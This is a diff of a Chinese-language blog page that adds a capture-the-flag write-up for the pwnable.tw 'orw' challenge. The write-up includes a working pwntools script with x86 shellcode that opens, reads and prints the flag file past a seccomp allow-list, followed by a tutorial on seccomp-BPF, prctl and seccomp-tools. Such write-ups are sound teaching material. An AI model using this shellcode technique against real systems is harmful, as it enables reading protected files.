@@ -79,16 +79,21 @@
 
 
 
-<meta name="description" content="Working hard never goes wrong.">
+<meta name="description" content="title: pwnable.tw orworworw_seccomp函数里面设置了白名单，通过seccomp-tools可以看到可以用的系统调用：     可以看到除了open，read，write等调用，其他的都被禁掉了，就不能通过execve来getshell，所以我们就通过这几个系统调用来读取flag。    123456789101112131415161718192021222324">
 <meta property="og:type" content="article">
-<meta property="og:title" content="20180808">
+<meta property="og:title" content="洋葱">
 <meta property="og:url" content="http://yaqing.site/2018/08/08/20180808/index.html">
 <meta property="og:site_name" content="洋葱">
-<meta property="og:description" content="Working hard never goes wrong.">
-<meta property="og:updated_time" content="2018-08-08T01:56:45.270Z">
+<meta property="og:description" content="title: pwnable.tw orworworw_seccomp函数里面设置了白名单，通过seccomp-tools可以看到可以用的系统调用：     可以看到除了open，read，write等调用，其他的都被禁掉了，就不能通过execve来getshell，所以我们就通过这几个系统调用来读取flag。    123456789101112131415161718192021222324">
+<meta property="og:image" content="https://ws1.sinaimg.cn/large/72105478gy1fu24s1b36zj20ia096t9r.jpg">
+<meta property="og:image" content="https://ws1.sinaimg.cn/large/72105478gy1fu86wqv7d3j20cl01dt8i.jpg">
+<meta property="og:image" content="https://ws1.sinaimg.cn/large/72105478gy1fu86xuieo8j20ox08nmxt.jpg">
+<meta property="og:image" content="https://ws1.sinaimg.cn/large/72105478gy1fu871anfc5j20ql0n7di3.jpg">
+<meta property="og:updated_time" content="2018-08-13T09:35:19.197Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="20180808">
-<meta name="twitter:description" content="Working hard never goes wrong.">
+<meta name="twitter:title" content="洋葱">
+<meta name="twitter:description" content="title: pwnable.tw orworworw_seccomp函数里面设置了白名单，通过seccomp-tools可以看到可以用的系统调用：     可以看到除了open，read，write等调用，其他的都被禁掉了，就不能通过execve来getshell，所以我们就通过这几个系统调用来读取flag。    123456789101112131415161718192021222324">
+<meta name="twitter:image" content="https://ws1.sinaimg.cn/large/72105478gy1fu24s1b36zj20ia096t9r.jpg">
 
 
 
@@ -124,7 +129,7 @@
 
 
 
-  <title>20180808 | 洋葱</title>
+  <title> | 洋葱</title>
   
 
 
@@ -248,7 +253,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">20180808</h1>
+          <h1 class="post-title" itemprop="name headline"></h1>
         
 
         <div class="post-meta">
@@ -308,7 +313,33 @@
       
 
       
-        
+        <hr>
+<h2 id="title-pwnable-tw-orw"><a href="#title-pwnable-tw-orw" class="headerlink" title="title: pwnable.tw orw"></a>title: pwnable.tw orw</h2><h2 id="orw"><a href="#orw" class="headerlink" title="orw"></a>orw</h2><p><code>orw_seccomp</code>函数里面设置了白名单，通过<a href="https://github.com/david942j/seccomp-tools" target="_blank" rel="external"><code>seccomp-tools</code></a>可以看到可以用的系统调用：   </p>
+<p><img src="https://ws1.sinaimg.cn/large/72105478gy1fu24s1b36zj20ia096t9r.jpg" alt=""></p>
+<p>可以看到除了<code>open</code>，<code>read</code>，<code>write</code>等调用，其他的都被禁掉了，就不能通过<code>execve</code>来<code>getshell</code>，所以我们就通过这几个系统调用来读取<code>flag</code>。   </p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> pwn  <span class="keyword">import</span> *</div><div class="line"></div><div class="line">context.log_level=<span class="string">"debug"</span></div><div class="line"><span class="comment">#shellcode=""</span></div><div class="line"><span class="comment">#shellcode+=asm("xor ecx,ecx;push ecx;push 0x67616c66;push 0x2f77726f;push 0x2f656d6f;push 0x682f2f2f;mov ebx,esp;xor edx,edx;mov eax,0x5;int 0x80;")</span></div><div class="line"><span class="comment">#shellcode+=asm("mov dl,0x40;;mov ecx,ebx;mov ebx,0x3;mov eax,0x3;int 0x80;")</span></div><div class="line"><span class="comment">#shellcode+=asm("mov bl,1;mov eax,0x4;;int 0x80;")</span></div><div class="line"></div><div class="line">shellcode=<span class="string">"""</span></div><div class="line">push 0x00</div><div class="line">push 0x67616c66</div><div class="line">push 0x2f77726f</div><div class="line">push 0x2f656d6f</div><div class="line">push 0x682f2f2f</div><div class="line">mov ebx,esp</div><div class="line">xor ecx,ecx</div><div class="line">xor edx,edx</div><div class="line">mov eax,5</div><div class="line">int 0x80</div><div class="line"></div><div class="line">mov edx,0x40</div><div class="line">mov ecx,esp</div><div class="line">mov ebx,eax</div><div class="line">mov eax,3</div><div class="line">int 0x80</div><div class="line"></div><div class="line">mov ebx,1</div><div class="line">mov ecx,esp</div><div class="line">mov edx,0x40</div><div class="line">mov eax,4</div><div class="line">int 0x80</div><div class="line">"""</div><div class="line">shellcode=asm(shellcode)</div><div class="line"></div><div class="line">pro=remote(<span class="string">"chall.pwnable.tw"</span>,<span class="number">10001</span>)</div><div class="line">pro.recvuntil(<span class="string">":"</span>)</div><div class="line">pro.sendline(shellcode)</div><div class="line"><span class="keyword">print</span> pro.recv()</div><div class="line"></div><div class="line">```    </div><div class="line"><span class="comment">## 关于`Linux下Seccomp-BPF`和`prctl`</span></div><div class="line"><span class="comment">### `BPF`和`Seccomp`</span></div><div class="line">&gt; `BPF`是一种用于`Unix`内核网络数据包的**过滤机制**。</div><div class="line"></div><div class="line">&gt;由于**大量的系统调用暴露在用户空间**，在程序的整个生命周期内并没有使用。而随着系统调用的改变和成熟，`bug`的发现和根除，一套可用的系统调用是满足用户程序基本的调用。将可以产生出一组**尽量少的系统调用暴露在用户空间**。系统调用的过滤就是在应用程序的使用中。</div><div class="line"></div><div class="line">&gt;`Seccomp`过滤器提给了一种手段，为一个进程调用系统调用时指定了过滤器，而这个过滤器则是`BPF`。`BPF`作为`socket`过滤器不同之处则是操作当前的`user_regs_struct`数据结构，这需要预先定义好系统调用的`ABI`和定义过滤规则。</div><div class="line"></div><div class="line">也就是说，`Seccomp`是一种`Linux`下的安全机制，通过它可以限制某些特定的系统调用在用户空间运行。</div><div class="line"></div><div class="line"><span class="comment">### `Seecomp`的使用</span></div><div class="line">```cpp=demo</div><div class="line"><span class="comment">#include &lt;fcntl.h&gt;</span></div><div class="line"><span class="comment">#include &lt;seccomp.h&gt;</span></div><div class="line"><span class="comment">#include &lt;sys/stat.h&gt;</span></div><div class="line"><span class="comment">#include &lt;sys/types.h&gt;</span></div><div class="line"></div><div class="line"><span class="comment">#define BUF_SIZE    256</span></div><div class="line"></div><div class="line">int main(int argc, char *argv[])</div><div class="line">&#123;</div><div class="line">    int rc = <span class="number">-1</span>;</div><div class="line">    scmp_filter_ctx ctx;</div><div class="line"></div><div class="line">    ctx = seccomp_init(SCMP_ACT_KILL);</div><div class="line"></div><div class="line">    rc = seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(close), <span class="number">0</span>);</div><div class="line"></div><div class="line">    rc = seccomp_load(ctx);</div><div class="line">    <span class="keyword">if</span> (rc &lt; <span class="number">0</span>)</div><div class="line">         goto out;</div><div class="line"></div><div class="line">    /* ... */</div><div class="line"></div><div class="line">out:</div><div class="line">    seccomp_release(ctx);</div><div class="line">    <span class="keyword">return</span> -rc;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p><code>seccomp_init</code>是过滤器通过<code>def action parameter</code>设置默认<code>action</code>从而设置初始化状态，没有初始化将不能调用其他函数。<code>seccomp_release</code>则将剩余的过滤器状态在重新初始化之前被释放掉。</p>
+<p>可用的<code>def action</code>如下：<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line">SCMP_ACT_KILL</div><div class="line">  The thread will be killed by the kernel when it calls a syscall that does <span class="keyword">not</span> match</div><div class="line">  any of the configured seccomp filter rules.</div><div class="line"></div><div class="line">SCMP_ACT_TRAP</div><div class="line">  The thread will <span class="keyword">throw</span> a SIGSYS signal when it calls a syscall that does  <span class="keyword">not</span>  match</div><div class="line">  any of the configured seccomp filter rules.</div><div class="line"></div><div class="line">SCMP_ACT_ERRNO(<span class="keyword">uint16_t</span> errno)</div><div class="line">  The  thread  will receive a <span class="keyword">return</span> value of errno when it calls a syscall that does</div><div class="line">  <span class="keyword">not</span> match any of the configured seccomp filter rules.</div><div class="line"></div><div class="line">SCMP_ACT_TRACE(<span class="keyword">uint16_t</span> msg_num)</div><div class="line">  If  the  thread  is  being  traced  <span class="keyword">and</span>   the   tracing   process   specified   the</div><div class="line">  PTRACE_O_TRACESECCOMP  option in the call to ptrace(<span class="number">2</span>), the tracing process will be</div><div class="line">  notified, via PTRACE_EVENT_SECCOMP , <span class="keyword">and</span> the  value  provided  in  msg_num  can  be</div><div class="line">  retrieved <span class="keyword">using</span> the PTRACE_GETEVENTMSG option.</div><div class="line"></div><div class="line">SCMP_ACT_ALLOW</div><div class="line">  The seccomp filter will have no effect on the thread calling the syscall <span class="keyword">if</span> it does</div><div class="line">  <span class="keyword">not</span> match any of the configured seccomp filter rules.</div></pre></td></tr></table></figure></p>
+<p><code>seccomp_rule_add</code>函数则是新添加法则到当前的<code>seccomp</code>过滤器中，然后通过<code>seccomp_load</code>加载生效。     </p>
+<p>所以，如果想用<code>seccomp</code>来限制系统调用，就可以先<code>seccomp_init(scmp_filter_ctx,SCMP_ACT_KILL)</code>先禁用掉所有系统调用，再通过<code>seccomp_rule_add(scmp_filter_ctx,SCMP_ACT_ALLOW,SCMP_SYS(execve))</code>添加系统调用，最后通过<code>seccomp_load(scmp_filter_ctx)</code>来加载生效。    </p>
+<h3 id="prctl函数"><a href="#prctl函数" class="headerlink" title="prctl函数"></a><code>prctl函数</code></h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/prctl.h&gt;</span></span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">prctl</span><span class="params">(<span class="keyword">int</span> option, <span class="keyword">unsigned</span> <span class="keyword">long</span> arg2, <span class="keyword">unsigned</span> <span class="keyword">long</span> arg3,<span class="keyword">unsigned</span> <span class="keyword">long</span> arg4, <span class="keyword">unsigned</span> <span class="keyword">long</span> arg5)</span></span>;</div></pre></td></tr></table></figure>
+<blockquote>
+<p> prctl()  is  called  with  a  first argument describing what to do (with values defined in<linux prctl.h="">), and further arguments with a significance depending on  the  first  one.</linux></p>
+</blockquote>
+<p>也就是说，<code>prctl()</code>函数的第一个参数决定了这个函数要干什么。<a href="http://manpages.ubuntu.com/manpages/xenial/en/man2/prctl.2.html" target="_blank" rel="external">第一个参数参考表</a></p>
+<p>以<code>orw</code>这题来看，第一个参数分别是38号和22号：<br><img src="https://ws1.sinaimg.cn/large/72105478gy1fu86wqv7d3j20cl01dt8i.jpg" alt=""></p>
+<p>那来看一下这两个参数所代表的功能：</p>
+<ul>
+<li><p><code>PR_SET_NO_NEW_PRIVS</code>（38）：说明当<code>arg2==1</code>的时候，没有系统调用权限<br><img src="https://ws1.sinaimg.cn/large/72105478gy1fu86xuieo8j20ox08nmxt.jpg" alt=""></p>
+</li>
+<li><p><code>PR_SET_SECCOMP</code>(22)：当<code>arg2==SECCOMP_MODE_STRICT</code>的时候，只允许<code>read</code>，<code>write</code>，<code>exit</code>和<code>sigreturn</code>调用；当<code>arg2==SECCOMP_MODE_FILTER</code>的时候，过滤器可以通过<code>arg3</code>，<code>BPF</code>来设定一系列系统调用。<br><img src="https://ws1.sinaimg.cn/large/72105478gy1fu871anfc5j20ql0n7di3.jpg" alt="">    </p>
+</li>
+</ul>
+<h3 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h3><ul>
+<li><a href="https://github.com/david942j/seccomp-tools" target="_blank" rel="external"><code>seccomp-tools</code></a><br>这个工具可以将设置的<code>seccomp</code>函数以<code>BPF</code>的形式导出来，从而就可以看到哪些系统调用在白名单里面了。</li>
+</ul>
+<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p><a href="http://www.selinuxplus.com/?p=370" target="_blank" rel="external">LINUX系统安全_SANDBOX_SECCOMP-BPF</a><br><a href="https://veritas501.space/2018/05/05/seccomp%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" target="_blank" rel="external">seccomp学习笔记</a></p>
+
       
     </div>
     
@@ -399,8 +430,17 @@
       
 
       
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
 
-      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
+      <section class="site-overview-wrap sidebar-panel">
         <div class="site-overview">
           <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
             
@@ -442,6 +482,22 @@
         </div>
       </section>
 
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#title-pwnable-tw-orw"><span class="nav-number">1.</span> <span class="nav-text">title: pwnable.tw orw</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#orw"><span class="nav-number">2.</span> <span class="nav-text">orw</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#prctl函数"><span class="nav-number">2.1.</span> <span class="nav-text">prctl函数</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#工具"><span class="nav-number">2.2.</span> <span class="nav-text">工具</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#参考资料"><span class="nav-number">3.</span> <span class="nav-text">参考资料</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
       
 
       
